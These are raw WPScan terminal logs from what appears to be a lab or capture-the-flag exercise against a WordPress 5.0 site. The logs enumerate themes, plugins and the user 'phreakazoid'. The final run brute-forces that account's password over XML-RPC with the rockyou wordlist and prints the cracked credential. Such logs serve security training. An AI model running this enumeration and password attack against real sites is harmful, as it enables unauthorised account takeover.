```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.114.179.100 --enumerate t              
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.114.179.100/ [10.10.67.130]
[+] Started: Mon Oct  3 18:58:16 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.114.179.100/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.114.179.100/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.114.179.100/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.114.179.100/?feed=rss2, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://10.114.179.100/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://10.114.179.100/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.114.179.100/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: A new Gutenberg-ready theme....
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:41 <> (399 / 399) 100.00% Time: 00:01:41
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://10.114.179.100/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.114.179.100/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.114.179.100/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: A new Gutenberg-ready theme....
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.114.179.100/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.0'

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 19:00:13 2022
[+] Requests Done: 830
[+] Cached Requests: 12
[+] Data Sent: 211.372 KB
[+] Data Received: 4.49 MB
[+] Memory used: 192.199 MB
[+] Elapsed time: 00:01:57
```

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.114.179.100 --enumerate p 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.114.179.100/ [10.10.67.130]
[+] Started: Mon Oct  3 19:14:56 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.114.179.100/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.114.179.100/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.114.179.100/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.114.179.100/?feed=rss2, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://10.114.179.100/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://10.114.179.100/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.114.179.100/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: A new Gutenberg-ready theme....
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] nextcellent-gallery-nextgen-legacy
 | Location: http://10.114.179.100/wp-content/plugins/nextcellent-gallery-nextgen-legacy/
 | Latest Version: 1.9.35 (up to date)
 | Last Updated: 2017-10-16T09:19:00.000Z
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (60% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://10.114.179.100/, Match: '<meta name="NextGEN" version="3.5.0"'

[+] nextgen-gallery
 | Location: http://10.114.179.100/wp-content/plugins/nextgen-gallery/
 | Last Updated: 2022-09-28T18:28:00.000Z
 | [!] The version is out of date, the latest version is 3.29
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://10.114.179.100/, Match: '<meta name="NextGEN" version="3.5.0"'
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://10.114.179.100/wp-content/plugins/nextgen-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://10.114.179.100/wp-content/plugins/nextgen-gallery/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 19:15:14 2022
[+] Requests Done: 35
[+] Cached Requests: 6
[+] Data Sent: 9.313 KB
[+] Data Received: 303.479 KB
[+] Memory used: 235.449 MB
[+] Elapsed time: 00:00:18
```

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.114.179.100 --enumerate u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.114.179.100/ [10.10.67.130]
[+] Started: Mon Oct  3 19:16:14 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.114.179.100/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.114.179.100/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.114.179.100/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.114.179.100/?feed=rss2, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://10.114.179.100/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://10.114.179.100/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.114.179.100/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: A new Gutenberg-ready theme....
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (0 / 10)  0.00%  ETA: ??:??: Brute Forcing Author IDs - Time: 00:00:00 <> (1 / 10) 10.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:00 <> (4 / 10) 40.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:00 <> (5 / 10) 50.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:01 <> (9 / 10) 90.00%  ETA: 00:00: Brute Forcing Author IDs - Time: 00:00:01 <> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] Phreakazoid
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] phreakazoid
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 19:16:22 2022
[+] Requests Done: 24
[+] Cached Requests: 37
[+] Data Sent: 6.305 KB
[+] Data Received: 89.572 KB
[+] Memory used: 167.25 MB
[+] Elapsed time: 00:00:08
```

```
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.114.179.100 -U phreakazoid -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.114.179.100/ [10.10.67.130]
[+] Started: Mon Oct  3 19:20:23 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.114.179.100/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.114.179.100/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.114.179.100/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.114.179.100/?feed=rss2, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://10.114.179.100/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://10.114.179.100/wp-content/themes/twentynineteen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://10.114.179.100/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: A new Gutenberg-ready theme....
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.114.179.100/wp-content/themes/twentynineteen/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] nextcellent-gallery-nextgen-legacy
 | Location: http://10.114.179.100/wp-content/plugins/nextcellent-gallery-nextgen-legacy/
 | Latest Version: 1.9.35 (up to date)
 | Last Updated: 2017-10-16T09:19:00.000Z
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (60% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://10.114.179.100/, Match: '<meta name="NextGEN" version="3.5.0"'

[+] nextgen-gallery
 | Location: http://10.114.179.100/wp-content/plugins/nextgen-gallery/
 | Last Updated: 2022-09-28T18:28:00.000Z
 | [!] The version is out of date, the latest version is 3.29
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://10.114.179.100/, Match: '<meta name="NextGEN" version="3.5.0"'
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://10.114.179.100/wp-content/plugins/nextgen-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://10.114.179.100/wp-content/plugins/nextgen-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Trying phreakazoid / turtle Time: 00:00:48 <> (500 / 14344392)  0.00%  ETA[SUCCESS] - phreakazoid / linkinpark                                      
Trying phreakazoid / linkinpark Time: 00:00:48 <> (503 / 14344897)  0.00% Trying phreakazoid / stupid Time: 00:00:48 <> (505 / 14344897)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: phreakazoid, Password: linkinpark

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct  3 19:21:37 2022
[+] Requests Done: 647
[+] Cached Requests: 39
[+] Data Sent: 297.169 KB
[+] Data Received: 347.363 KB
[+] Memory used: 235.887 MB
[+] Elapsed time: 00:01:14
```
